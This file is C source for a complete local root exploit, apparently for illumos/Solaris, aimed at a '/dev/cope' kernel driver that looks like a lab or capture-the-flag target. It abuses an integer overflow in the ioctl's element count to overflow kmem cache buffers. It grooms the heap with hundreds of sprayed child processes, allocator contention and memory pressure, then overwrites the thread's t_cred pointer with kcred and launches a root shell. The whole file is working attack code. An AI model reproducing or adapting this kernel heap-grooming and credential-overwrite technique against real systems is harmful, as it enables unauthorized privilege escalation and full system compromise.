#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/processor.h>

#include <procfs.h>

#include <dirent.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define COPEIOC         (('c' << 24) | ('o' << 16) | ('p' << 8) | 'e')
#define COPEIOC_COPE    (COPEIOC | 1)

#define SPRAY_CHILDREN          224
#define CONTENTION_CHILDREN     8
#define CONTENTION_BATCH        32
#define BATCH_PAIRS             48
#define MAX_BATCHES             8
#define PURGE_TIMEOUT_SEC       45
#define SPRAY_CPU               0
#define PRESSURE_STEP_MB        64
#define PRESSURE_LIMIT_MB       640

#define T_CRED_OFFSET           456u

typedef struct cope {
	uint8_t  co_data[8];
	uint32_t co_id;
} __attribute__((packed)) cope_t;

typedef struct cope_ioc {
	cope_t   *ci_copes;
	uint32_t  ci_ncope;
	uint32_t  _pad;
} cope_ioc_t;

enum child_op {
	CHILD_POISON = 'x',
	CHILD_EXIT = 'q'
};

struct child_cmd {
	uint8_t op;
	uint8_t _pad[7];
	uint64_t arg;
};

struct child_resp {
	int32_t err;
	uint32_t aux;
};

struct child_handle {
	pid_t pid;
	int cmd_w;
	int rsp_r;
};

struct cache_strategy {
	const char *cache_name;
	uint32_t grow_ncope;
	uint32_t overflow_ncope;
	uint32_t cache_size;
	int initial_magazine_size;
	int poison_idx[4];
	size_t n_poison_idx;
};

struct cache_stats {
	long magazine_size;
	long slab_free;
	long reap;
	long depot_contention;
	long full_magazines;
};

static const struct cache_strategy strategies[] = {
	{
		.cache_name = "kmem_alloc_112",
		.grow_ncope = 8,
		.overflow_ncope = 0x40000008u,
		.cache_size = 112,
		.initial_magazine_size = 7,
		.poison_idx = { 17 },
		.n_poison_idx = 1
	},
	{
		.cache_name = "kmem_alloc_160",
		.grow_ncope = 12,
		.overflow_ncope = 0x4000000cu,
		.cache_size = 160,
		.initial_magazine_size = 7,
		.poison_idx = { 25 },
		.n_poison_idx = 1
	},
	{
		.cache_name = "kmem_alloc_40",
		.grow_ncope = 2,
		.overflow_ncope = 0x40000002u,
		.cache_size = 40,
		.initial_magazine_size = 15,
		.poison_idx = { 5, 15, 25 },
		.n_poison_idx = 3
	}
};

static const struct cache_strategy *g_strategy;

static ssize_t
must_read_full(int fd, void *buf, size_t len)
{
	size_t off = 0;

	while (off < len) {
		ssize_t n = read(fd, (char *)buf + off, len - off);
		if (n < 0) {
			if (errno == EINTR)
				continue;
			return (-1);
		}
		if (n == 0)
			break;
		off += (size_t)n;
	}

	return ((ssize_t)off);
}

static ssize_t
must_write_full(int fd, const void *buf, size_t len)
{
	size_t off = 0;

	while (off < len) {
		ssize_t n = write(fd, (const char *)buf + off, len - off);
		if (n < 0) {
			if (errno == EINTR)
				continue;
			return (-1);
		}
		off += (size_t)n;
	}

	return ((ssize_t)off);
}

static void
bind_cpu_best_effort(int cpu)
{
	processorid_t old_cpu;

	if (cpu < 0)
		return;

	(void) processor_bind(P_LWPID, P_MYID, (processorid_t)cpu, &old_cpu);
}

static int
do_cope(int fd, uint32_t ncope, cope_t *copes)
{
	cope_ioc_t ioc;

	memset(&ioc, 0, sizeof (ioc));
	ioc.ci_copes = copes;
	ioc.ci_ncope = ncope;
	return (ioctl(fd, COPEIOC_COPE, &ioc));
}

static int
grow_to_target(int fd, uint64_t first_qword)
{
	cope_t copes[30];

	memset(copes, 0, sizeof (copes));
	memcpy(copes[0].co_data, &first_qword, sizeof (first_qword));

	if (do_cope(fd, g_strategy->grow_ncope, copes) != 0)
		return (errno);

	return (0);
}

static int
poison_target(int fd, uint64_t forge)
{
	cope_t copes[30];
	size_t i;

	memset(copes, 0, sizeof (copes));
	for (i = 0; i < g_strategy->n_poison_idx; i++)
		memcpy(copes[g_strategy->poison_idx[i]].co_data, &forge,
		    sizeof (forge));

	if (do_cope(fd, g_strategy->overflow_ncope, copes) != 0)
		return (errno);

	return (0);
}

static int
read_psinfo_addr(const char *path, uintptr_t *addrp)
{
	psinfo_t ps;
	int fd;
	ssize_t n;

	fd = open(path, O_RDONLY);
	if (fd < 0)
		return (errno);

	n = read(fd, &ps, sizeof (ps));
	(void) close(fd);
	if (n != sizeof (ps))
		return (EIO);

	*addrp = (uintptr_t)ps.pr_addr;
	return (0);
}

static int
get_self_kthread(uintptr_t *addrp)
{
	DIR *dir;
	struct dirent *de;
	char path[128];
	lwpsinfo_t ls;
	int fd;
	int lwpid = -1;

	dir = opendir("/proc/self/lwp");
	if (dir == NULL)
		return (errno);

	while ((de = readdir(dir)) != NULL) {
		char *end;
		long v;

		if (de->d_name[0] == '.')
			continue;

		v = strtol(de->d_name, &end, 10);
		if (*de->d_name == '\0' || *end != '\0')
			continue;

		lwpid = (int)v;
		break;
	}
	(void) closedir(dir);

	if (lwpid < 0)
		return (ESRCH);

	(void) snprintf(path, sizeof (path), "/proc/self/lwp/%d/lwpsinfo", lwpid);
	fd = open(path, O_RDONLY);
	if (fd < 0)
		return (errno);

	if (read(fd, &ls, sizeof (ls)) != sizeof (ls)) {
		(void) close(fd);
		return (EIO);
	}
	(void) close(fd);

	*addrp = (uintptr_t)ls.pr_addr;
	return (0);
}

static int
get_ksym_addr(const char *name, uintptr_t *addrp)
{
	char cmd[256];
	char line[512];
	FILE *fp;
	char *p;

	(void) snprintf(cmd, sizeof (cmd),
	    "nm /dev/ksyms 2>/dev/null | grep '|%s$' | head -1", name);
	fp = popen(cmd, "r");
	if (fp == NULL)
		return (errno);

	if (fgets(line, sizeof (line), fp) == NULL) {
		(void) pclose(fp);
		return (ENOENT);
	}
	(void) pclose(fp);

	p = strchr(line, '|');
	if (p == NULL)
		return (EINVAL);

	*addrp = (uintptr_t)strtoull(p + 1, NULL, 0);
	if (*addrp == 0)
		return (ENOENT);

	return (0);
}

static int
parse_kstat_value(const char *line, const char *key, long *out)
{
	const char *p;
	char *end;

	p = strstr(line, key);
	if (p == NULL)
		return (0);

	p = strrchr(line, '\t');
	if (p == NULL)
		p = strrchr(line, ' ');
	if (p == NULL)
		return (-1);

	errno = 0;
	*out = strtol(p + 1, &end, 0);
	if (errno != 0 || end == p + 1)
		return (-1);

	return (1);
}

static int
get_cache_stats(const char *cache_name, struct cache_stats *st)
{
	FILE *fp;
	char cmd[256];
	char line[512];
	int seen = 0;

	memset(st, 0, sizeof (*st));
	st->magazine_size = -1;
	st->slab_free = -1;
	st->reap = -1;
	st->depot_contention = -1;
	st->full_magazines = -1;

	(void) snprintf(cmd, sizeof (cmd), "kstat -p -n %s 2>/dev/null",
	    cache_name);
	fp = popen(cmd, "r");
	if (fp == NULL)
		return (errno);

	while (fgets(line, sizeof (line), fp) != NULL) {
		if (parse_kstat_value(line, ":magazine_size", &st->magazine_size) > 0)
			seen++;
		else if (parse_kstat_value(line, ":slab_free", &st->slab_free) > 0)
			seen++;
		else if (parse_kstat_value(line, ":reap", &st->reap) > 0)
			seen++;
		else if (parse_kstat_value(line, ":depot_contention",
		    &st->depot_contention) > 0)
			seen++;
		else if (parse_kstat_value(line, ":full_magazines",
		    &st->full_magazines) > 0)
			seen++;
	}

	(void) pclose(fp);
	return (seen > 0 ? 0 : ENOENT);
}

static void
spray_child_main(int cpu, int cmd_r, int rsp_w)
{
	struct child_cmd cmd;
	struct child_resp resp;
	int fd;

	bind_cpu_best_effort(cpu);

	fd = open("/dev/cope", O_RDWR);
	if (fd < 0)
		_exit(111);

	resp.err = grow_to_target(fd, 0);
	resp.aux = 0;
	if (must_write_full(rsp_w, &resp, sizeof (resp)) != sizeof (resp))
		_exit(112);

	for (;;) {
		ssize_t n = must_read_full(cmd_r, &cmd, sizeof (cmd));
		if (n != sizeof (cmd))
			break;

		if (cmd.op == CHILD_POISON) {
			resp.err = poison_target(fd, cmd.arg);
			resp.aux = 0;
			if (must_write_full(rsp_w, &resp, sizeof (resp)) !=
			    sizeof (resp))
				break;
		} else if (cmd.op == CHILD_EXIT) {
			break;
		} else {
			resp.err = EINVAL;
			resp.aux = 0;
			(void) must_write_full(rsp_w, &resp, sizeof (resp));
		}
	}

	(void) close(fd);
	_exit(0);
}

static void
contention_child_main(int cpu)
{
	int fds[CONTENTION_BATCH];
	int i;

	bind_cpu_best_effort(cpu);

	for (;;) {
		for (i = 0; i < CONTENTION_BATCH; i++) {
			fds[i] = open("/dev/cope", O_RDWR);
			if (fds[i] >= 0)
				(void) grow_to_target(fds[i], 0);
		}
		for (i = CONTENTION_BATCH - 1; i >= 0; i--) {
			if (fds[i] >= 0)
				(void) close(fds[i]);
		}
	}
}

static void
pressure_child_main(void)
{
	void *chunks[PRESSURE_LIMIT_MB / PRESSURE_STEP_MB];
	long page_size;
	size_t step, i, off;

	memset(chunks, 0, sizeof (chunks));
	page_size = sysconf(_SC_PAGESIZE);
	if (page_size < 4096)
		page_size = 4096;
	step = (size_t)PRESSURE_STEP_MB * 1024 * 1024;

	for (i = 0; i < sizeof (chunks) / sizeof (chunks[0]); i++) {
		volatile char *p;

		p = mmap(NULL, step, PROT_READ | PROT_WRITE,
		    MAP_PRIVATE | MAP_ANON, -1, 0);
		if (p == MAP_FAILED)
			break;
		chunks[i] = (void *)p;
		for (off = 0; off < step; off += (size_t)page_size)
			p[off] = 1;
		usleep(50000);
	}

	for (;;)
		pause();
}

static void
pair_child_main(int cpu, uint64_t first_qword, int rsp_w, int cmd_r)
{
	struct child_resp resp;
	char ch;
	int fd;

	bind_cpu_best_effort(cpu);

	fd = open("/dev/cope", O_RDWR);
	if (fd < 0) {
		resp.err = errno;
		resp.aux = 0;
		(void) must_write_full(rsp_w, &resp, sizeof (resp));
		_exit(121);
	}

	resp.err = grow_to_target(fd, first_qword);
	resp.aux = 0;
	if (must_write_full(rsp_w, &resp, sizeof (resp)) != sizeof (resp))
		_exit(122);

	while (read(cmd_r, &ch, 1) == 1) {
		if (ch == 'q')
			break;
	}

	(void) close(fd);
	_exit(0);
}

static int
spawn_spray_child(struct child_handle *out, int cpu)
{
	int cmd_pipe[2];
	int rsp_pipe[2];
	struct child_resp resp;
	pid_t pid;

	if (pipe(cmd_pipe) != 0 || pipe(rsp_pipe) != 0)
		return (errno);

	pid = fork();
	if (pid < 0)
		return (errno);
	if (pid == 0) {
		(void) close(cmd_pipe[1]);
		(void) close(rsp_pipe[0]);
		spray_child_main(cpu, cmd_pipe[0], rsp_pipe[1]);
	}

	(void) close(cmd_pipe[0]);
	(void) close(rsp_pipe[1]);

	if (must_read_full(rsp_pipe[0], &resp, sizeof (resp)) != sizeof (resp) ||
	    resp.err != 0) {
		(void) close(cmd_pipe[1]);
		(void) close(rsp_pipe[0]);
		(void) waitpid(pid, NULL, 0);
		return (resp.err != 0 ? resp.err : EIO);
	}

	out->pid = pid;
	out->cmd_w = cmd_pipe[1];
	out->rsp_r = rsp_pipe[0];
	return (0);
}

static void
close_child_handle(struct child_handle *ch)
{
	struct child_cmd cmd;

	if (ch->pid <= 0)
		return;

	memset(&cmd, 0, sizeof (cmd));
	cmd.op = CHILD_EXIT;
	if (ch->cmd_w >= 0)
		(void) write(ch->cmd_w, &cmd, sizeof (cmd));
	if (ch->cmd_w >= 0)
		(void) close(ch->cmd_w);
	if (ch->rsp_r >= 0)
		(void) close(ch->rsp_r);
	(void) waitpid(ch->pid, NULL, 0);

	ch->pid = -1;
	ch->cmd_w = -1;
	ch->rsp_r = -1;
}

static int
spawn_pair_child(struct child_handle *out, int cpu, uint64_t first_qword)
{
	int cmd_pipe[2];
	int rsp_pipe[2];
	struct child_resp resp;
	pid_t pid;

	if (pipe(cmd_pipe) != 0 || pipe(rsp_pipe) != 0)
		return (errno);

	pid = fork();
	if (pid < 0)
		return (errno);
	if (pid == 0) {
		(void) close(cmd_pipe[1]);
		(void) close(rsp_pipe[0]);
		pair_child_main(cpu, first_qword, rsp_pipe[1], cmd_pipe[0]);
	}

	(void) close(cmd_pipe[0]);
	(void) close(rsp_pipe[1]);

	if (must_read_full(rsp_pipe[0], &resp, sizeof (resp)) != sizeof (resp) ||
	    resp.err != 0) {
		(void) close(cmd_pipe[1]);
		(void) close(rsp_pipe[0]);
		(void) waitpid(pid, NULL, 0);
		return (resp.err != 0 ? resp.err : EIO);
	}

	out->pid = pid;
	out->cmd_w = cmd_pipe[1];
	out->rsp_r = rsp_pipe[0];
	return (0);
}

static int
wait_for_ready(const struct cache_strategy *st, int timeout_sec)
{
	struct cache_stats stats, base;
	time_t begin;
	int got_start = 0;

	begin = time(NULL);
	for (;;) {
		if (get_cache_stats(st->cache_name, &stats) == 0) {
			if (!got_start) {
				base = stats;
				got_start = 1;
			}

			(void) printf("[*] %s: magazine_size=%ld slab_free=%ld "
			    "reap=%ld depot=%ld full=%ld\n",
			    st->cache_name, stats.magazine_size,
			    stats.slab_free, stats.reap,
			    stats.depot_contention, stats.full_magazines);
			(void) fflush(stdout);

			if (stats.magazine_size != st->initial_magazine_size ||
			    (got_start && stats.reap > base.reap) ||
			    (got_start && stats.slab_free > base.slab_free))
				return (0);
		}

		if (time(NULL) - begin >= timeout_sec)
			return (ETIMEDOUT);

		sleep(2);
	}
}

static int
try_strategy(const struct cache_strategy *st, uintptr_t thread_addr,
    uintptr_t kcred_addr)
{
	struct child_handle spray[SPRAY_CHILDREN];
	pid_t contenders[CONTENTION_CHILDREN];
	pid_t pressure = 0;
	uint64_t forge;
	uint64_t write_qword;
	long ncpu;
	int i, rv = EAGAIN;
	struct child_cmd cmd;
	struct child_resp resp;
	struct child_handle writer = { .pid = -1, .cmd_w = -1, .rsp_r = -1 };
	struct child_handle consumer = { .pid = -1, .cmd_w = -1, .rsp_r = -1 };

	g_strategy = st;
	memset(spray, 0xff, sizeof (spray));
	memset(contenders, 0, sizeof (contenders));

	forge = (uint64_t)(thread_addr + T_CRED_OFFSET + st->cache_size - 20);
	write_qword = (uint64_t)kcred_addr;

	(void) printf("[*] strategy=%s thread=%#" PRIxPTR " t_cred=%#" PRIxPTR
	    " kcred=%#" PRIxPTR " forge=%#" PRIx64 "\n",
	    st->cache_name, thread_addr, thread_addr + T_CRED_OFFSET,
	    kcred_addr, forge);
	(void) fflush(stdout);

	(void) printf("[*] spraying %d children in %s on cpu %d\n",
	    SPRAY_CHILDREN, st->cache_name, SPRAY_CPU);
	(void) fflush(stdout);

	for (i = 0; i < SPRAY_CHILDREN; i++) {
		rv = spawn_spray_child(&spray[i], SPRAY_CPU);
		if (rv != 0)
			goto cleanup_fail;
	}

	(void) printf("[*] freeing candidate B buffers\n");
	(void) fflush(stdout);
	for (i = 1; i < SPRAY_CHILDREN; i += 2)
		close_child_handle(&spray[i]);

	(void) printf("[*] inducing depot contention / magazine resize\n");
	(void) fflush(stdout);
	ncpu = sysconf(_SC_NPROCESSORS_ONLN);
	if (ncpu < 1)
		ncpu = 2;
	for (i = 0; i < CONTENTION_CHILDREN; i++) {
		pid_t pid = fork();
		if (pid < 0) {
			rv = errno;
			goto cleanup_fail;
		}
		if (pid == 0)
			contention_child_main((int)(i % ncpu));
		contenders[i] = pid;
	}

	rv = wait_for_ready(st, 16);
	if (rv == ETIMEDOUT) {
		(void) printf("[*] no allocator transition yet, adding bounded "
		    "memory pressure\n");
		(void) fflush(stdout);
		pressure = fork();
		if (pressure < 0) {
			rv = errno;
			goto cleanup_fail;
		}
		if (pressure == 0)
			pressure_child_main();
		rv = wait_for_ready(st, PURGE_TIMEOUT_SEC - 16);
	}

	for (i = 0; i < CONTENTION_CHILDREN; i++) {
		if (contenders[i] > 0) {
			(void) kill(contenders[i], SIGKILL);
			(void) waitpid(contenders[i], NULL, 0);
		}
	}
	if (pressure > 0) {
		(void) kill(pressure, SIGKILL);
		(void) waitpid(pressure, NULL, 0);
	}
	sleep(1);

	if (rv != 0)
		goto cleanup_fail;

	memset(&cmd, 0, sizeof (cmd));
	cmd.op = CHILD_POISON;
	cmd.arg = forge;

	for (int batch = 0; batch < MAX_BATCHES; batch++) {
		(void) printf("[*] batch %d/%d: re-poisoning A side\n",
		    batch + 1, MAX_BATCHES);
		(void) fflush(stdout);

		for (i = 0; i < SPRAY_CHILDREN; i += 2) {
			struct pollfd pfd;

			if (spray[i].pid <= 0)
				continue;
			if (must_write_full(spray[i].cmd_w, &cmd, sizeof (cmd)) !=
			    sizeof (cmd)) {
				(void) printf("[!] poison write to child %d "
				    "failed, dropping it\n", i);
				close_child_handle(&spray[i]);
				continue;
			}

			memset(&pfd, 0, sizeof (pfd));
			pfd.fd = spray[i].rsp_r;
			pfd.events = POLLIN;
			if (poll(&pfd, 1, 100) != 1 ||
			    !(pfd.revents & POLLIN)) {
				(void) printf("[!] poison child %d timed out\n",
				    i);
				close_child_handle(&spray[i]);
				continue;
			}

			if (must_read_full(spray[i].rsp_r, &resp, sizeof (resp)) !=
			    sizeof (resp)) {
				(void) printf("[!] poison child %d went away\n",
				    i);
				close_child_handle(&spray[i]);
				continue;
			}
			if (resp.err != 0) {
				(void) printf("[!] poison child %d failed: %d\n",
				    i, resp.err);
				close_child_handle(&spray[i]);
			}
		}

		for (int attempt = 0; attempt < BATCH_PAIRS; attempt++) {
			rv = spawn_pair_child(&consumer, SPRAY_CPU, 0);
			if (rv != 0) {
				(void) printf("[!] consumer spawn failed: %s\n",
				    strerror(rv));
				continue;
			}

			rv = spawn_pair_child(&writer, SPRAY_CPU, write_qword);
			if (rv != 0) {
				close_child_handle(&consumer);
				(void) printf("[!] writer spawn failed: %s\n",
				    strerror(rv));
				continue;
			}

			if (geteuid() == 0) {
				(void) printf("[+] root via writer pid=%d\n",
				    writer.pid);
				(void) fflush(stdout);
				close_child_handle(&consumer);
				goto success;
			}

			close_child_handle(&writer);
			close_child_handle(&consumer);
		}
	}

	rv = EAGAIN;
	goto cleanup_fail;

success:
	for (i = 0; i < SPRAY_CHILDREN; i += 2)
		close_child_handle(&spray[i]);

	return (0);

cleanup_fail:
	close_child_handle(&writer);
	close_child_handle(&consumer);
	if (pressure > 0) {
		(void) kill(pressure, SIGKILL);
		(void) waitpid(pressure, NULL, 0);
	}
	for (i = 0; i < CONTENTION_CHILDREN; i++) {
		if (contenders[i] > 0) {
			(void) kill(contenders[i], SIGKILL);
			(void) waitpid(contenders[i], NULL, 0);
		}
	}
	for (i = 0; i < SPRAY_CHILDREN; i++) {
		if (spray[i].pid > 0)
			close_child_handle(&spray[i]);
	}
	return (rv != 0 ? rv : EAGAIN);
}

static int
become_root_via_tcred(void)
{
	uintptr_t thread_addr = 0, kcred_addr = 0;
	size_t i;
	int rv;

	rv = get_self_kthread(&thread_addr);
	if (rv != 0)
		errx(1, "failed to get self kthread: %s", strerror(rv));

	rv = get_ksym_addr("kcred", &kcred_addr);
	if (rv != 0)
		errx(1, "failed to resolve kcred: %s", strerror(rv));

	for (i = 0; i < sizeof (strategies) / sizeof (strategies[0]); i++) {
		rv = try_strategy(&strategies[i], thread_addr, kcred_addr);
		if (rv == 0)
			return (0);
		(void) printf("[!] strategy %s failed: %s\n",
		    strategies[i].cache_name, strerror(rv));
		(void) fflush(stdout);
	}

	errx(1, "all t_cred strategies failed");
}

int
main(int argc, char **argv)
{
	(void) signal(SIGPIPE, SIG_IGN);

	if (geteuid() == 0) {
		(void) puts("[*] already root");
		goto have_root;
	}

	become_root_via_tcred();

have_root:
	(void) printf("[*] uid=%d euid=%d\n", getuid(), geteuid());
	(void) fflush(stdout);

	if (argc > 1) {
		execvp(argv[1], &argv[1]);
		err(1, "execvp %s", argv[1]);
	}

	execl("/bin/sh", "sh", NULL);
	err(1, "execl /bin/sh");
}
